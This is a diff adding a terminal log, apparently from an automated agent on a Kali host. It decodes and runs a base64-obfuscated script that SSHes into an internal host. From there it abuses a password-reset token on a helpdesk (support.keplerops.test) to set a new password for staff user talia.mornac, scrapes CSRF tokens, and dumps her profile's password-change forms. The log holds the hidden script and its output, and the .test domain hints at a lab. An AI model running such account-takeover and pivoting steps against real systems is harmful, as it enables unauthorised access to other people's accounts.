@@ -1,0 +1,66 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r13.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2NrcC50eHQ7IHJtIC1mICRKClRPS0VOPWsxNy10YWxpYS1tb3JuYWMtcmV2aWV3LXRva2VuLTI4NDEKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1jICRKIC1iICRKICIkQi9zY3AvcHdyZXNldC5waHA/dG9rZW49JFRPS0VOIiAtbyAvdG1wL3gxLmh0bWwKVD0kKGdyZXAgLW9FICduYW1lPSJfX0NTUkZUb2tlbl9fIiB2YWx1ZT0iW14iXSsiJyAvdG1wL3gxLmh0bWwgfCBzZWQgLUUgJ3MvLip2YWx1ZT0iKFteIl0rKSIuKi9cMS8nKQpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogLVggUE9TVCAiJEIvc2NwL3B3cmVzZXQucGhwIiBcCiAgLS1kYXRhLXVybGVuY29kZSAiX19DU1JGVG9rZW5fXz0kVCIgLS1kYXRhLXVybGVuY29kZSAiZG89bmV3cGFzc3dkIiAtLWRhdGEtdXJsZW5jb2RlICJ0b2tlbj0kVE9LRU4iIFwKICAtLWRhdGEtdXJsZW5jb2RlICJ1c2VyaWQ9dGFsaWEubW9ybmFjIiAtLWRhdGEtdXJsZW5jb2RlICJzdWJtaXQ9TG9naW4iIC1vIC9kZXYvbnVsbApjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogIiRCL3NjcC9wcm9maWxlLnBocCIgLW8gL3RtcC9wcm9mLmh0bWwKZWNobyAiPT09IEZPUk0gKyBJTlBVVFMgPT09IgpweXRob24zIC0gPDwnUFknCmltcG9ydCByZQpkPW9wZW4oJy90bXAvcHJvZi5odG1sJyxlcnJvcnM9J2lnbm9yZScpLnJlYWQoKQojIHByaW50IGFsbCBmb3JtcyBhbmQgaW5wdXRzIHdpdGggY29udGV4dApmb3IgbSBpbiByZS5maW5kaXRlcihyJzxmb3JtXGIuKj88L2Zvcm0+JywgZCwgZmxhZ3M9cmUuU3xyZS5JKToKICAgIGY9bS5ncm91cCgwKQogICAgcHJpbnQoJ0ZPUk06JywgcmUuc2VhcmNoKHInPGZvcm1bXj5dKj4nLGYsZmxhZ3M9cmUuSSkuZ3JvdXAoMCkpCiAgICBmb3IgaW5wIGluIHJlLmZpbmRhbGwocic8KGlucHV0fHNlbGVjdHx0ZXh0YXJlYSlcYi4qPz4nLCBmLCBmbGFncz1yZS5TfHJlLkkpOgogICAgICAgIHByaW50KCcgICcsIGlucFs6MjAwXS5yZXBsYWNlKCdcbicsJyAnKSkKICAgIHByaW50KCctLS0nKQpQWQojIGFsc28gZXh0cmFjdCBwYXNzd29yZCBzZWN0aW9uIGNvbnRleHQKZ3JlcCAtbiAtaSAtQTYgLUI2ICdjaGFuZ2UgcGFzc3dvcmRcfG5ldyBwYXNzd29yZFx8Y3VycmVudCBwYXNzd29yZFx8cGFzc3dvcmQnIC90bXAvcHJvZi5odG1sIHwgaGVhZCAtODAKSU5ORVIK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r13.sh; bash /tmp/r13.sh; echo DONEMARK_1795194922471$((6*7))
+=== FORM + INPUTS ===
+FORM: <form action="profile.php" method="post" class="save" autocomplete="off">
+   input
+   input
+   input
+   input
+   input
+   input
+   input
+   input
+   input
+   input
+   select
+   input
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   select
+   textarea
+---
+70-    <nav class="" id="">
+71-  <ul id="sub_nav">
+72-<li><a class="logs" href="dashboard.php" title="" id="subnav0" >Dashboard</a></li><li><a class="teams" href="directory.php" title="" id="subnav1" >Agent Directory</a></li><li><a class="users active" href="profile.php" title="" id="subnav2" >My Profile</a></li>  </ul>
+73-</nav>
+74-
+75-        <div id="content">
+76:                    <div id="msg_error"><b>Hi Talia</b> - You must <a data-dialog="ajax.php/staff/4/change-password" href="#">change your password to continue</a>!</div>
+77-        
+78-<form action="profile.php" method="post" class="save" autocomplete="off">
+79- <input type="hidden" name="__CSRFToken__" value="d21dd424d4c63133c5beff7e49f40508516b402c" /> <input type="hidden" name="do" value="update">
+80- <input type="hidden" name="id" value="4">
+81-<h2>My Account Profile</h2>
+82-  <ul class="clean tabs">
+--
+146-            <span class="error">*</span></td>
+147-          <td>
+148-            <input type="text" size="40" style="width:300px"
+149-              class="staff-username typeahead"
+150-              name="username" disabled value="talia.mornac" />
+151-            <button type="button" id="change-pw-button" class="action-button" onclick="javascript:
+152:            $.dialog('ajax.php/staff/'+4+'/change-password', 201);">
+153:              <i class="icon-refresh"></i> Change Password            </button>
+154-            <i class="offset help-tip icon-question-sign" href="#username"></i>
+155-            <div class="error"></div>
+156-          </td>
+157-        </tr>
+158-
+159-        <tr>
